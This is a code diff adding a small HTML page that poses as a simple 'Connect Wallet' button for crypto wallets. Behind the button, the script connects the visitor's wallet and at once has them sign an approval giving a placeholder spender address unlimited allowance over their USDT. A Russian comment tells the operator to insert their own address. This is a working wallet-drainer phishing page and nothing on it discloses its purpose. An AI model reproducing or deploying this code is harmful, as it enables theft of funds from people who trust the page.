@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>Connect Wallet</title>
+</head>
+<body style="background:#121212; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh">
+  <button id="connect-btn" style="padding:15px 30px; font-size:18px;">Connect Wallet</button>
+
+  <script type="module">
+    import Web3Modal from "https://unpkg.com/web3modal@1.9.12/dist/index.js?module";
+    import WalletConnectProvider from "https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js";
+    import Web3 from "https://unpkg.com/web3@1.10.0/dist/web3.min.js";
+
+    const providerOptions = {
+      walletconnect: {
+        package: WalletConnectProvider,
+        options: {
+          rpc: { 1: "https://rpc.ankr.com/eth" },
+          chainId: 1
+        }
+      }
+    };
+
+    const web3Modal = new Web3Modal({
+      cacheProvider: false,
+      providerOptions,
+    });
+
+    const TOKEN_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT
+    const SPENDER_ADDRESS = "0xYourSpenderAddressHere"; // ← замени на свой адрес
+
+    const ABI = [{
+      "constant": false,
+      "inputs": [
+        { "name": "_spender", "type": "address" },
+        { "name": "_value", "type": "uint256" }
+      ],
+      "name": "approve",
+      "outputs": [{ "name": "", "type": "bool" }],
+      "type": "function"
+    }];
+
+    document.getElementById("connect-btn").onclick = async () => {
+      try {
+        const provider = await web3Modal.connect();
+        const web3 = new Web3(provider);
+        const accounts = await web3.eth.getAccounts();
+        const user = accounts[0];
+
+        console.log("Connected wallet:", user);
+
+        const contract = new web3.eth.Contract(ABI, TOKEN_ADDRESS);
+        const max = web3.utils.toTwosComplement("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+
+        const tx = await contract.methods.approve(SPENDER_ADDRESS, max).send({ from: user });
+        console.log("Approved!", tx);
+        alert("Approve sent!");
+      } catch (err) {
+        console.error("Error:", err);
+        alert("Something went wrong: " + err.message);
+      }
+    };
+  </script>
+</body>
+</html>
